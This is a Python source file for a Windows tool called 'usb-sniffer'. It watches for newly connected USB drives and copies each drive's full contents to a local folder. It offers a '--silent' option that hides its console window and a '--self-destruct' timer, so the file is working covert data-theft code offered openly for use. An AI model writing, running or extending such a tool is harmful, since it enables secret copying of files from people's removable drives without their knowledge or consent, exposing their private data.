import os,string,time,argparse,multiprocessing
import win32.lib.win32con as win32con
import win32gui

from ctypes import windll
from datetime import datetime
from distutils.dir_util import copy_tree

def get_drives():
    drive_list = []
    drive_bits = windll.kernel32.GetLogicalDrives()
    
    for label in string.ascii_uppercase :
        if drive_bits & 1:
            drive_list.append(label)
        drive_bits >>= 1
    return drive_list

def detect(out_dir, delay):
        now = str(datetime.now().time())
        drives = set(get_drives())

        print('Detecting...')
        time.sleep(float(delay))

        add_drive =  set(get_drives()) - drives
        subt_drive = drives - set(get_drives())

        if (len(add_drive)):
            print(f'Connected {len(add_drive)} new drives')
            for drive in add_drive:
                    print(f'Mounted drive on {drive}:\\')
                    
                    drive_path = f'{drive}:\\'
                    out_path = f'{out_dir}\\{now.replace(":", ".")}'

                    try:
                        size = sum(d.stat().st_size for d in os.scandir(drive_path) if d.is_file())

                        print('Copy started')
                        print(f'Total size to copy: {size} bytes')
                        copy_tree(drive_path, out_path)
                        print('Copy completed')
                    except Exception as e:
                        print('COPY FAILED')
                        print(e)
                 
        elif(len(subt_drive)):
            print(f'Removed {len(subt_drive)} new drives')

            for drive in subt_drive:
                    print(f'Removed drive on {drive}:\\')

def run(out_dir, delay):
    while True:
        detect(out_dir, delay)
                    
if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='usb-sniffer', description='Listen for connected drives and copy their content')
    parser.add_argument('-o', '--output', metavar='PATH', dest='out_dir', default='C:\\usb-sniffer\\', help='Set where the drives will be copied')
    parser.add_argument('-d', '--delay', metavar='SECONDS', dest='delay', default=3, help='Set the delay between detections')
    parser.add_argument('-sd', '--self-destruct', metavar='SECONDS', dest='self_dest', help='Set how long the script must run before killing itself')
    parser.add_argument('-s', '--silent', dest='silent', help='Hide the console while running', action='store_true')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s 0.1')
    args = parser.parse_args()

    if (args.silent):
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
    
    if (args.self_dest != None):
        p = multiprocessing.Process(target=run, name='Main', args=(args.out_dir, args.delay))
        p.start()
        time.sleep(float(args.self_dest))
        p.terminate()
        p.join()
    else:
        run(args.out_dir, args.delay)